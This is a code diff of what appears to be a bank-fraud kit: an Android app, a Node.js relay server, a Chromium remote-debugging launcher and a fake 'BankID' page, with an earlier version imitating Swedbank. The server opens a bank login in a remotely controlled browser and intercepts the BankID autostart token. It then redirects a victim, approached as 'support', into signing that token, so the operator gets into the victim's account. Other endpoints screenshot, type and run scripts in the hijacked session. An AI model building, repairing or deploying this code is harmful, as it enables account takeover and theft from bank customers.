-                      v.component = null
-                      v.setPackage("com.bankid.bus")
-                      v.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                      startActivity(v)
-                  } catch (x: Throwable) {}
-              }
-
-              private fun oppnaApp(s: String): Boolean {
-                  return try {
-                      val i = if (s.startsWith("intent:")) Intent.parseUri(s, Intent.URI_INTENT_SCHEME)
-                              else Intent(Intent.ACTION_VIEW, Uri.parse(s))
-                      i.setComponent(null)
-                      i.setSelector(null)
-                      i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                      if (i.resolveActivity(packageManager) != null) {
-                          startActivity(i); true
-                      } else {
-                          val fb = i.getStringExtra("browser_fallback_url")
-                          val pkg = i.`package`
-                          when {
-                              fb != null -> { web.loadUrl(fb); true }
-                              pkg != null -> {
-                                  startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + pkg)))
-                                  true
-                              }
-                              else -> false
-                          }
-                      }
-                  } catch (x: Throwable) { false }
-              }
-
-              private fun taIn() {
-                  if (!skickat) { bar.text = "vanta - inget token skickat an"; return }
-                  if (inne) { bar.text = "redan inne - ror inte sidan"; return }
-                  if (tarIn) return
-                  tarIn = true
+              private fun startaPoll() {
                   Thread {
-                      try {
-                          var i = 0
-                          while (i < 8) {
-                              if (inne) {
-                                  runOnUiThread { bar.text = "INNE - ror inte sidan" }
-                                  return@Thread
-                              }
-                              i++
-                              val n = i
-                              runOnUiThread {
-                                  bar.text = "vacker + replay (" + n + "/8)"
-                                  try { startActivity(Intent(this@MainActivity, VackActivity::class.java)) } catch (x: Throwable) {}
-                                  try { web.evaluateJavascript(nudge, null) } catch (x: Throwable) {}
-                                  try { web.evaluateJavascript("window.__replay&&window.__replay()", null) } catch (x: Throwable) {}
-                              }
-                              try { appReplay() } catch (x: Throwable) {}
-                              try { Thread.sleep(2500) } catch (x: Throwable) {}
-                              val nu = nuUrl
-                              if (loginStam.isNotEmpty() && nu.isNotEmpty() && stam(nu) != loginStam) {
-                                  runOnUiThread { bar.text = "SIDAN GICK VIDARE - du ar inne" }
-                                  return@Thread
-                              }
+                      while (!stopp) {
+                          val c = code
+                          val uu = u()
+                          if (c.isNotEmpty() && uu.isNotEmpty()) {
+                              try {
+                                  val j = JSONObject(get(uu + "/api/state?code=" + c))
+                                  if (j.optBoolean("signed") && !signed) {
+                                      signed = true
+                                      ui.post { statusView.text = "KUNDEN HAR SIGNERAT - se skarmen" }
+                                  }
+                              } catch (e: Throwable) { }
                           }
-                          if (inne) {
-                              runOnUiThread { bar.text = "INNE - ingen omladdning" }
-                              return@Thread
-                          }
-                          runOnUiThread {
-                              if (inne) { bar.text = "INNE - ingen omladdning"; return@runOnUiThread }
-                              val retur = efterUrl.isNotEmpty() && stam(efterUrl) != loginStam
-                              bar.text = if (retur) "sidan star still - laddar retur-url" else "sidan star still - laddar banksidan"
-                              loginStam = ""
-                              try { web.onResume() } catch (x: Throwable) {}
-                              web.loadUrl(if (retur) efterUrl else bankUrl)
-                          }
-                      } finally { tarIn = false }
+                          if (!chromeOk) ui.post { if (statusView.text.isEmpty()) statusView.text = "chrome inte kopplad - kor chrome.sh" }
+                          try { Thread.sleep(2500) } catch (e: Throwable) { }
+                      }
                   }.start()
               }
 
-              private fun visaLank(c: String) {
-                  val u = baseUrl + "/k/" + c
-                  linkView.text = u
-                  try {
-                      val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-                      cm.setPrimaryClip(ClipData.newPlainText("lank", u))
-                      bar.text = "lank kopierad - klistra in till kunden"
-                  } catch (t: Throwable) {
-                      bar.text = "lank ovan - markera och kopiera"
+              private fun post(u: String, body: String): String {
+                  val c = URL(u).openConnection() as HttpURLConnection
+                  c.requestMethod = "POST"
+                  c.connectTimeout = 12000
+                  c.readTimeout = 25000
+                  c.doOutput = true
+                  c.setRequestProperty("Content-Type", "application/json")
+                  c.outputStream.use { it.write(body.toByteArray()) }
+                  val sc = c.responseCode
+                  return (if (sc in 200..299) c.inputStream else c.errorStream)
+                      ?.bufferedReader()?.use { it.readText() } ?: ""
+              }
+
+              private fun get(u: String): String {
+                  val c = URL(u).openConnection() as HttpURLConnection
+                  c.connectTimeout = 12000
+                  c.readTimeout = 25000
+                  val sc = c.responseCode
+                  return (if (sc in 200..299) c.inputStream else c.errorStream)
+                      ?.bufferedReader()?.use { it.readText() } ?: ""
+              }
+
+              private fun trad(b: () -> Unit) {
+                  Thread { try { b() } catch (e: Throwable) { ui.post { logga("FEL " + e.toString().take(100)) } } }.start()
+              }
+
+              private fun logga(s: String) {
+                  ui.post {
+                      rader.addLast(s.replace("\n", " ").take(180))
+                      while (rader.size > 6) rader.removeFirst()
+                      debugView.text = rader.joinToString("\n")
                   }
               }
 
-              private fun newSession(after: String? = null, hel: String = "") {
-                  if (after != null) { vantande = after; vantandeHel = hel }
-                  if (baseUrl.isEmpty()) { bar.text = "skriv server-url forst"; return }
-                  if (skapar) return
-                  skapar = true
-                  val b = baseUrl
-                  Thread {
-                      var c = ""
-                      try {
-                          val con = URL(b + "/api/session").openConnection() as HttpURLConnection
-                          con.requestMethod = "POST"; con.doOutput = true
-                          con.setRequestProperty("Content-Type", "text/plain")
-                          con.connectTimeout = 8000; con.readTimeout = 8000
-                          con.outputStream.write(ByteArray(0)); con.outputStream.flush()
-                          if (con.responseCode in 200..299)
-                              c = Regex("\"code\"\\s*:\\s*\"([A-Za-z0-9]+)\"")
-                                  .find(con.inputStream.bufferedReader().readText())
-                                  ?.groupValues?.get(1) ?: ""
-                          con.disconnect()
-                      } catch (t: Throwable) {}
-                      val cc = c
-                      runOnUiThread {
-                          skapar = false
-                          if (cc.isEmpty()) { bar.text = "kunde inte skapa session"; return@runOnUiThread }
-                          p.edit().putString("code", cc).apply()
-                          last = ""; skickat = false; signerad = false; loginStam = ""; efterUrl = ""; inne = false
-                          inBtn.isEnabled = false
-                          visaLank(cc)
-                          if (vantande.isNotEmpty()) {
-                              val t = vantande; val h = vantandeHel
-                              vantande = ""; vantandeHel = ""
-                              last = t
-                              skicka(t, h)
-                          }
-                      }
-                  }.start()
+              private fun lp(): LinearLayout.LayoutParams =
+                  LinearLayout.LayoutParams(-1, -2).also { it.setMargins(dp(6), dp(2), dp(6), dp(2)) }
+
+              private fun lpv(): LinearLayout.LayoutParams =
+                  LinearLayout.LayoutParams(0, -2, 1f).also { it.setMargins(dp(3), dp(2), dp(3), dp(2)) }
+
+              private fun knapp(t: String, c: String): Button {
+                  val b = Button(this)
+                  b.text = t
+                  b.textSize = 12f
+                  b.setBackgroundColor(Color.parseColor(c))
+                  b.setTextColor(Color.WHITE)
+                  return b
               }
 
-              private fun poll() {
-                  Thread {
-                      while (alive) {
-                          try { Thread.sleep(2000) } catch (t: Throwable) {}
-                          if (signerad || inne) continue
-                          val c = p.getString("code", "") ?: ""
-                          if (c.isEmpty() || baseUrl.isEmpty()) continue
-                          try {
-                              val con = URL(baseUrl + "/api/session/" + c + "/state").openConnection() as HttpURLConnection
-                              con.connectTimeout = 4000; con.readTimeout = 4000
-                              val txt = con.inputStream.bufferedReader().readText()
-                              con.disconnect()
-                              if (txt.indexOf("\"signed\":true") >= 0) {
-                                  signerad = true
-                                  runOnUiThread {
-                                      inBtn.setBackgroundColor(Color.parseColor("#22aa55"))
-                                      bar.text = "KUNDEN HAR SIGNERAT - vacker banken"
-                                  }
-                                  try { Thread.sleep(3000) } catch (t: Throwable) {}
-                                  taIn()
-                              }
-                          } catch (t: Throwable) {}
-                      }
-                  }.start()
+              private fun felt(hint: String, text: String): EditText {
+                  val e = EditText(this)
+                  e.hint = hint
+                  e.setText(text)
+                  e.setTextColor(Color.WHITE)
+                  e.setHintTextColor(Color.parseColor("#6b7280"))
+                  e.textSize = 12f
+                  e.setSingleLine(true)
+                  return e
               }
 
-              private fun post(path: String, body: String) {
-                  if (baseUrl.isEmpty()) return
-                  val b = baseUrl
-                  Thread {
-                      try {
-                          val con = URL(b + path).openConnection() as HttpURLConnection
-                          con.requestMethod = "POST"
-                          con.doOutput = true
-                          con.setRequestProperty("Content-Type", "application/json")
-                          con.connectTimeout = 8000
-                          con.readTimeout = 8000
-                          con.outputStream.write(body.toByteArray())
-                          con.outputStream.flush()
-                          con.responseCode
-                          con.disconnect()
-                      } catch (t: Throwable) {}
-                  }.start()
-              }
+              private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
 
-              override fun onDestroy() {
-                  alive = false
-                  stangPopup()
-                  super.onDestroy()
-              }
-
-              override fun onBackPressed() {
-                  if (popup != null) { stangPopup(); return }
-                  if (web.canGoBack()) web.goBack() else super.onBackPressed()
-              }
+              override fun onDestroy() { stopp = true; super.onDestroy() }
           }
           EOF
 
           w server/package.json <<'EOF'
           {
-            "name": "relay",
-            "version": "1.0.0",
+            "name": "relay-server",
+            "version": "2.0.0",
             "private": true,
-            "dependencies": {
-              "express": "^4.19.2"
-            },
-            "scripts": {
-              "start": "node server.js"
-            }
+            "scripts": { "start": "node server.js" },
+            "dependencies": { "ws": "^8.18.0" }
           }
+          EOF
+
+          w server/chrome.sh <<'EOF'
+          #!/data/data/com.termux/files/usr/bin/bash
+          # Startar Termux:X11 + en riktig Chromium med fjarrstyrning pa port 9222.
+          termux-wake-lock
+          export DISPLAY=:0
+          pkill -f termux.x11 2>/dev/null
+          sleep 1
+          termux-x11 :0 >/dev/null 2>&1 &
+          sleep 4
+          exec chromium \
+            --user-data-dir="$HOME/cprof" \
+            --remote-debugging-port=9222 \
+            --remote-allow-origins='*' \
+            --no-first-run --no-default-browser-check \
+            --disable-gpu --disable-dev-shm-usage \
+            --window-size=420,900 \
+            about:blank
+          EOF
+
+          w server/start.sh <<'EOF'
+          #!/data/data/com.termux/files/usr/bin/bash
+          cd "$(dirname "$0")"
+          [ -d node_modules ] || npm install --no-audit --no-fund
+          exec node server.js
           EOF
 
           w server/server.js <<'EOF'
-          const express = require('express');
+          const http = require('http');
+          const fs = require('fs');
           const path = require('path');
-          const app = express();
+          const WebSocket = require('ws');
 
-          app.use(express.text({ type: '*/*' }));
+          const PORT = process.env.PORT || 3000;
+          const CDP = process.env.CDP || 'http://127.0.0.1:9222';
+          const FIL = path.join(__dirname, 'sessioner.json');
 
-          const S = {};
-          const LIV = 10 * 60 * 1000;
+          let S = {};
+          let aktiv = null;
+          try {
+            const j = JSON.parse(fs.readFileSync(FIL, 'utf8'));
+            if (j && j.S) { S = j.S; aktiv = j.aktiv || null; } else { S = j || {}; }
+          } catch (e) { S = {}; }
 
-          function ny() {
-            let c;
-            do { c = Math.random().toString(36).slice(2, 7).toUpperCase(); } while (S[c]);
-            return c;
+          let dirty = false;
+          setInterval(() => {
+            if (!dirty) return;
+            dirty = false;
+            try { fs.writeFileSync(FIL, JSON.stringify({ S, aktiv })); } catch (e) {}
+          }, 2000);
+
+          let vp = { w: 412, h: 900 };
+
+          /* ---------------- CDP mot Chromium ---------------- */
+          let ws = null, mid = 0, kopplad = false;
+          const vantar = new Map();
+          const lyssnare = {};
+
+          function cdp(method, params) {
+            return new Promise((resolve, reject) => {
+              if (!ws || ws.readyState !== 1) return reject(new Error('ingen chrome'));
+              const id = ++mid;
+              const t = setTimeout(() => {
+                if (vantar.has(id)) { vantar.delete(id); reject(new Error('timeout ' + method)); }
+              }, 20000);
+              vantar.set(id, {
+                resolve: (v) => { clearTimeout(t); resolve(v); },
+                reject: (e) => { clearTimeout(t); reject(e); }
+              });
+              ws.send(JSON.stringify({ id, method, params: params || {} }));
+            });
           }
 
-          function stada() {
-            const nu = Date.now();
-            for (const k of Object.keys(S)) {
-              if (nu - S[k].skapad > LIV) delete S[k];
-            }
+          function pa(metod, fn) { (lyssnare[metod] = lyssnare[metod] || []).push(fn); }
+
+          function hamtaJSON(url, metod) {
+            return new Promise((resolve, reject) => {
+              const u = new URL(url);
+              const req = http.request(
+                { hostname: u.hostname, port: u.port, path: u.pathname + u.search, method: metod || 'GET' },
+                (r) => {
+                  let d = '';
+                  r.on('data', (c) => d += c);
+                  r.on('end', () => { try { resolve(JSON.parse(d)); } catch (e) { reject(e); } });
+                });
+              req.on('error', reject);
+              req.setTimeout(4000, () => req.destroy(new Error('timeout')));
+              req.end();
+            });
           }
-          setInterval(stada, 60000);
 
-          function giltigToken(t) {
-            return typeof t === 'string' && /^[0-9a-fA-F-]{8,}$/.test(t);
+          async function kopplaChrome() {
+            if (kopplad || (ws && ws.readyState === 1)) return;
+            try {
+              let lista = await hamtaJSON(CDP + '/json/list');
+              let sida = (lista || []).find((t) => t.type === 'page');
+              if (!sida) sida = await hamtaJSON(CDP + '/json/new?about:blank', 'PUT');
+              if (!sida || !sida.webSocketDebuggerUrl) throw new Error('ingen sida');
+              const sock = new WebSocket(sida.webSocketDebuggerUrl, { perMessageDeflate: false });
+              ws = sock;
+              sock.on('open', async () => {
+                kopplad = true;
+                console.log('chrome: kopplad');
+                try {
+                  await cdp('Page.enable');
+                  await cdp('Network.enable');
+                  await cdp('Runtime.enable');
+                  await sattViewport();
+                  if (aktiv && S[aktiv] && S[aktiv].bank) {
+                    await cdp('Page.navigate', { url: S[aktiv].bank });
+                  }
+                } catch (e) { console.log('chrome: enable-fel', e.message); }
+              });
+              sock.on('message', (d) => {
+                let m; try { m = JSON.parse(d.toString()); } catch (e) { return; }
+                if (m.id && vantar.has(m.id)) {
+                  const v = vantar.get(m.id); vantar.delete(m.id);
+                  if (m.error) v.reject(new Error(m.error.message)); else v.resolve(m.result);
+                  return;
+                }
+                if (m.method) {
+                  const l = lyssnare[m.method];
+                  if (l) for (const f of l) { try { f(m.params); } catch (e) {} }
+                }
+              });
+              sock.on('close', () => { kopplad = false; ws = null; });
+              sock.on('error', () => {});
+            } catch (e) { /* tyst, provas igen */ }
           }
 
-          const KLAR = '<!doctype html><meta charset="utf-8">' +
-            '<meta name="viewport" content="width=device-width,initial-scale=1">' +
-            '<style>body{margin:0;font-family:-apple-system,Roboto,sans-serif;background:#f3f3f3;text-align:center;padding:60px 24px;color:#1a1a1a}' +
-            'h2{color:#ff6a00;font-size:22px}p{color:#555;font-size:15px}</style>' +
-            '<h2>Klart</h2><p>Signeringen ar klar.<br>Du kan stanga sidan.</p>';
+          async function sattViewport() {
+            await cdp('Emulation.setDeviceMetricsOverride',
+              { width: vp.w, height: vp.h, deviceScaleFactor: 1, mobile: true });
+            await cdp('Emulation.setTouchEmulationEnabled', { enabled: true, maxTouchPoints: 1 });
+          }
 
-          app.post('/api/session', (req, res) => {
-            const c = ny();
-            S[c] = { token: '', at: 0, signed: false, redirect: '', skapad: Date.now() };
-            res.json({ ok: true, code: c });
-          });
+          /* ---------------- token fran natverkslagret ---------------- */
+          function urUrl(u) {
+            const m = /[?&]autostarttoken=([^&#]+)/i.exec(u || '');
+            return m ? decodeURIComponent(m[1]) : null;
+          }
 
-          app.get('/api/session/:code/state', (req, res) => {
-            const s = S[req.params.code];
-            if (!s) { res.json({ ok: false }); return; }
-            const ttl = s.token ? Math.max(0, Math.round((s.at + 30000 - Date.now()) / 1000)) : 0;
-            res.json({ ok: true, token: s.token, ttl: ttl, signed: s.signed, redirect: s.redirect });
-          });
-
-          app.post('/api/session/:code/token', (req, res) => {
-            let b;
-            try { b = JSON.parse(req.body); } catch (e) { b = { token: String(req.body || '').trim() }; }
-            const t = String(b.token || '').trim();
-            if (!giltigToken(t)) { res.json({ ok: false }); return; }
-
-            let s = S[req.params.code];
-            if (!s) { s = { token: '', at: 0, signed: false, redirect: '', skapad: Date.now() }; S[req.params.code] = s; }
+          function tokenHittad(t, kalla) {
+            if (!t) return;
+            if (!aktiv || !S[aktiv]) { console.log('token utan aktiv session', t.slice(0, 8)); return; }
+            const s = S[aktiv];
+            if (s.token === t) return;
             s.token = t;
-            s.redirect = String(b.redirect || '').trim();
-            s.at = Date.now();
-            s.signed = false;
-            res.json({ ok: true });
+            s.bankidSkickad = false;
+            s.tokenTid = Date.now();
+            s.kalla = kalla;
+            dirty = true;
+            console.log('TOKEN (' + kalla + ') ->', aktiv, t.slice(0, 8));
+          }
+
+          pa('Network.requestWillBeSent', (p) => {
+            const u = p && p.request && p.request.url;
+            if (u && (u.indexOf('bankid://') === 0 || u.indexOf('intent:') === 0)) tokenHittad(urUrl(u), 'deeplink');
           });
 
-          app.get('/api/signed', (req, res) => {
-            const s = S[req.query.code];
-            if (s) s.signed = true;
-            const r = s && s.redirect ? s.redirect : '';
-            if (/^https?:\/\//i.test(r) && r.indexOf('trycloudflare') < 0) {
-              res.redirect(302, r);
-              return;
+          pa('Page.frameRequestedNavigation', (p) => {
+            if (p && p.url) { const t = urUrl(p.url); if (t) tokenHittad(t, 'frame'); }
+          });
+
+          pa('Network.responseReceived', (p) => {
+            const r = p && p.response;
+            if (!r || !r.url) return;
+            if (!/json|text|javascript/i.test(r.mimeType || '')) return;
+            if (!/auth|bankid|apionline|collect|token|login/i.test(r.url)) return;
+            cdp('Network.getResponseBody', { requestId: p.requestId }).then((b) => {
+              const txt = b.base64Encoded ? Buffer.from(b.body, 'base64').toString('utf8') : b.body;
+              const m = /"autoStartToken"\s*:\s*"([^"]+)"/i.exec(txt);
+              if (m) tokenHittad(m[1], 'svar');
+            }).catch(() => {});
+          });
+
+          setInterval(() => { if (!kopplad) kopplaChrome(); }, 3000);
+
+          /* ---------------- hjalpare ---------------- */
+          function nyKod() {
+            const A = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+            let k;
+            do {
+              k = '';
+              for (let i = 0; i < 5; i++) k += A[Math.floor(Math.random() * A.length)];
+            } while (S[k]);
+            return k;
+          }
+
+          function svar(res, o, sc) {
+            res.writeHead(sc || 200, {
+              'Content-Type': 'application/json',
+              'Access-Control-Allow-Origin': '*',
+              'Access-Control-Allow-Headers': '*',
+              'Cache-Control': 'no-store'
+            });
+            res.end(JSON.stringify(o));
+          }
+
+          function kropp(req) {
+            return new Promise((r) => { let d = ''; req.on('data', (c) => d += c); req.on('end', () => r(d)); });
+          }
+
+          function las(namn) {
+            try { return fs.readFileSync(path.join(__dirname, namn), 'utf8'); } catch (e) { return 'saknas: ' + namn; }
+          }
+
+          function sida(titel, txt, extra) {
+            return '<!doctype html><html lang="sv"><head><meta charset="utf-8">' +
+              '<meta name="viewport" content="width=device-width,initial-scale=1"><title>' + titel + '</title>' +
+              '<style>body{margin:0;font-family:-apple-system,Roboto,Arial,sans-serif;background:#f4f6f8;' +
+              'color:#12212e;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}' +
+              'div{background:#fff;border-radius:14px;padding:26px;width:86%;max-width:380px;' +
+              'box-shadow:0 6px 24px rgba(0,0,0,.1)}h1{font-size:20px;margin:0 0 8px}p{font-size:15px;line-height:1.45}' +
+              'a{color:#0b5cab;font-size:15px}</style>' + (extra || '') +
+              '</head><body><div><h1>' + titel + '</h1><p>' + txt + '</p></div></body></html>';
+          }
+
+          /* ---------------- rutter ---------------- */
+          http.createServer(async (req, res) => {
+            const u = new URL(req.url, 'http://x');
+            const p = u.pathname;
+
+            if (req.method === 'OPTIONS') {
+              res.writeHead(204, {
+                'Access-Control-Allow-Origin': '*',
+                'Access-Control-Allow-Headers': '*',
+                'Access-Control-Allow-Methods': '*'
+              });
+              return res.end();
             }
-            res.send(KLAR);
-          });
 
-          app.get('/k/:code', (req, res) => {
-            if (!S[req.params.code]) { res.status(404).send('okand kod'); return; }
-            res.sendFile(path.join(__dirname, 'public', 'k.html'));
-          });
+            if (p === '/') {
+              res.writeHead(200, { 'Content-Type': 'text/plain' });
+              return res.end('relay ok' + (kopplad ? ' + chrome' : ' (chrome ej kopplad)'));
+            }
 
-          app.get('/', (req, res) => { res.send('relay ok'); });
+            // Kortlank: 303 rakt till bankid://
+            if (p === '/b') {
+              const k = (u.searchParams.get('code') || '').toUpperCase();
+              const igen = u.searchParams.get('igen') === '1';
+              const s = S[k];
+              res.setHeader('Cache-Control', 'no-store');
+              if (!s) {
+                res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+                return res.end(sida('Koden hittades inte', 'Be supporten om koden igen.'));
+              }
+              if (s.token && (!s.bankidSkickad || igen)) {
+                s.bankidSkickad = true; dirty = true;
+                console.log('303 bankid ->', k, String(s.token).slice(0, 8));
+                res.writeHead(303, { 'Location': 'bankid:///?autostarttoken=' + s.token + '&redirect=null' });
+                return res.end();
+              }
+              res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+              if (!s.token) {
+                return res.end(sida('Vantar...', 'Supporten skapar en BankID-order. Sidan fortsatter sjalv.',
+                  '<meta http-equiv="refresh" content="1;url=/b?code=' + k + '">'));
+              }
+              return res.end(sida('BankID ar oppnat',
+                'Signera i BankID-appen. <a href="/b?code=' + k + '&igen=1">Oppna igen</a>'));
+            }
 
-          app.listen(3000, () => console.log('relay pa :3000'));
+            if (p === '/k' || p === '/k.html') {
+              res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+              return res.end(las('k.html'));
+            }
+
+            // Skapa session och oppna banken i chrome
+            if (p === '/api/kor' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              let k = String(d.code || '').toUpperCase();
+              if (!k || !S[k]) {
+                k = nyKod();
+                S[k] = { code: k, token: null, redirect: null, signed: false, skapad: Date.now() };
+              }
+              S[k].token = null; S[k].signed = false; S[k].bankidSkickad = false;
+              S[k].bank = d.bank || S[k].bank || null;
+              aktiv = k;
+              dirty = true;
+              console.log('KOR', k, S[k].bank);
+              if (kopplad && S[k].bank) cdp('Page.navigate', { url: S[k].bank }).catch(() => {});
+              return svar(res, { ok: true, code: k, chrome: kopplad });
+            }
+
+            if (p === '/api/session' && req.method === 'POST') {
+              const k = nyKod();
+              S[k] = { code: k, token: null, redirect: null, signed: false, skapad: Date.now() };
+              aktiv = k; dirty = true;
+              console.log('ny session', k);
+              return svar(res, { ok: true, code: k });
+            }
+
+            if (p === '/api/token' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              const s = S[d.code];
+              if (!s) return svar(res, { ok: false, fel: 'okand kod' }, 404);
+              s.token = d.token || null;
+              s.redirect = d.redirect || null;
+              s.tokenTid = Date.now();
+              s.bankidSkickad = false;
+              aktiv = d.code;
+              dirty = true;
+              console.log('token (app) ->', d.code, String(s.token).slice(0, 8));
+              return svar(res, { ok: true });
+            }
+
+            if (p === '/api/skarm') {
+              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
+              try {
+                const r = await cdp('Page.captureScreenshot',
+                  { format: 'jpeg', quality: 60, captureBeyondViewport: false });
+                return svar(res, { ok: true, bild: r.data, w: vp.w, h: vp.h });
+              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
+            }
+
+            if (p === '/api/peka' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
+              const x = Number(d.x) || 0, y = Number(d.y) || 0;
+              try {
+                await cdp('Input.dispatchTouchEvent', { type: 'touchStart', touchPoints: [{ x, y }] });
+                await cdp('Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] });
+                return svar(res, { ok: true });
+              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
+            }
+
+            if (p === '/api/rulla' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
+              try {
+                await cdp('Input.dispatchMouseEvent', {
+                  type: 'mouseWheel', x: Number(d.x) || 0, y: Number(d.y) || 0,
+                  deltaX: 0, deltaY: Number(d.dy) || 0
+                });
+                return svar(res, { ok: true });
+              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
+            }
+
+            if (p === '/api/text' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
+              try {
+                await cdp('Input.insertText', { text: String(d.t || '') });
+                return svar(res, { ok: true });
+              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
+            }
+
+            if (p === '/api/tangent' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
+              const map = {
+                enter: { vk: 13, key: 'Enter', code: 'Enter', txt: '\r' },
+                tab: { vk: 9, key: 'Tab', code: 'Tab' },
+                back: { vk: 8, key: 'Backspace', code: 'Backspace' },
+                esc: { vk: 27, key: 'Escape', code: 'Escape' }
+              };
+              const v = map[String(d.k || '')];
+              if (!v) return svar(res, { ok: false, fel: 'okand tangent' });
+              try {
+                await cdp('Input.dispatchKeyEvent', {
+                  type: 'rawKeyDown', windowsVirtualKeyCode: v.vk, key: v.key, code: v.code
+                });
+                if (v.txt) await cdp('Input.dispatchKeyEvent', { type: 'char', text: v.txt, key: v.key });
+                await cdp('Input.dispatchKeyEvent', {
+                  type: 'keyUp', windowsVirtualKeyCode: v.vk, key: v.key, code: v.code
+                });
+                return svar(res, { ok: true });
+              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
+            }
+
+            if (p === '/api/js' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
+              try {
+                const r = await cdp('Runtime.evaluate',
+                  { expression: String(d.js || ''), returnByValue: true, awaitPromise: true });
+                return svar(res, { ok: true, svar: r && r.result ? r.result.value : null });
+              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
+            }
+
+            if (p === '/api/oppna' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
+              try {
+                await cdp('Page.navigate', { url: String(d.url || '') });
+                return svar(res, { ok: true });
+              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
+            }
+
+            if (p === '/api/viewport' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              vp.w = Math.max(200, Math.min(1200, Number(d.w) || 412));
+              vp.h = Math.max(300, Math.min(2200, Number(d.h) || 900));
+              try { if (kopplad) await sattViewport(); } catch (e) {}
+              return svar(res, { ok: true, w: vp.w, h: vp.h });
+            }
+
+            if (p === '/api/state') {
+              const s = S[u.searchParams.get('code')];
+              if (!s) return svar(res, { ok: false, chrome: kopplad }, 404);
+              return svar(res, {
+                ok: true,
+                token: !!s.token,
+                signed: !!s.signed,
+                chrome: kopplad,
+                aktiv: aktiv,
+                kalla: s.kalla || null,
+                tokenTid: s.tokenTid || null,
+                signeradTid: s.signeradTid || null
+              });
+            }
+
+            if (p === '/api/signed' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              const s = S[d.code];
+              if (!s) return svar(res, { ok: false }, 404);
+              s.signed = true; s.signeradTid = Date.now(); dirty = true;
+              console.log('signerad', d.code);
+              return svar(res, { ok: true });
+            }
+
+            if (p === '/api/join' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              const k = String(d.code || '').toUpperCase();
+              if (!S[k]) return svar(res, { ok: false, fel: 'fel kod' }, 404);
+              return svar(res, { ok: true });
+            }
+
+            if (p === '/api/poll') {
+              const s = S[u.searchParams.get('code')];
+              if (!s) return svar(res, { ok: false, fel: 'okand kod' }, 404);
+              return svar(res, { ok: true, token: s.token, signed: s.signed });
+            }
+
+            res.writeHead(404);
+            res.end('nej');
+          }).listen(PORT, '0.0.0.0', () => console.log('relay lyssnar pa ' + PORT));
           EOF
 
-          w server/public/k.html <<'EOF'
+          w server/k.html <<'EOF'
           <!doctype html>
-          <html>
-          <head>
-          <meta charset="utf-8">
-          <meta name="viewport" content="width=device-width,initial-scale=1">
-          <title>Swedbank</title>
+          <html lang="sv"><head>
+          <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+          <title>BankID</title>
           <style>
-          body{margin:0;font-family:-apple-system,Roboto,sans-serif;background:#f3f3f3;color:#1a1a1a}
-          .top{background:#fff;padding:16px 20px;font-weight:700;color:#ff6a00;font-size:20px;border-bottom:1px solid #e6e6e6}
-          .wrap{padding:30px 20px;text-align:center}
-          h1{font-size:19px;font-weight:600;line-height:1.45;margin:0 0 8px}
-          p{color:#555;font-size:15px;line-height:1.55}
-          #b{display:block;margin:26px auto 0;padding:18px;max-width:340px;box-sizing:border-box;border-radius:10px;background:#e9e9e9;color:#8a8a8a;font-size:17px;font-weight:700;text-decoration:none}
-          #b.live{background:#ff6a00;color:#fff}
-          #b small{display:block;font-weight:400;font-size:12px;margin-top:7px;opacity:.85}
-          .spin{width:34px;height:34px;margin:26px auto;border:3px solid #ddd;border-top-color:#ff6a00;border-radius:50%;animation:s 1s linear infinite}
-          @keyframes s{to{transform:rotate(360deg)}}
-          .foot{font-size:13px;color:#777;margin-top:34px;line-height:1.5}
-          .ok{font-size:44px;margin:10px 0;color:#22aa55;font-weight:700}
-          </style>
-          </head>
-          <body>
-          <div class="top">Swedbank</div>
-          <div class="wrap">
-            <div class="ok" id="ok"></div>
-            <h1 id="h">Valkommen!</h1>
-            <p id="t">Vanligen invanta BankID-signeringen for att fortsatta.</p>
-            <div class="spin" id="sp"></div>
-            <a id="b" href="#">Vantar...</a>
-            <p class="foot">Du ar nu i kontakt med Swedbank.<br>Folj instruktionerna.</p>
+          body{margin:0;font-family:-apple-system,Roboto,Arial,sans-serif;background:#f4f6f8;color:#12212e;
+               display:flex;align-items:center;justify-content:center;min-height:100vh}
+          #box{background:#fff;border-radius:14px;padding:26px 20px;width:88%;max-width:380px;
+               box-shadow:0 6px 24px rgba(0,0,0,.10);text-align:center}
+          input{font-size:26px;letter-spacing:6px;text-align:center;width:80%;padding:10px;
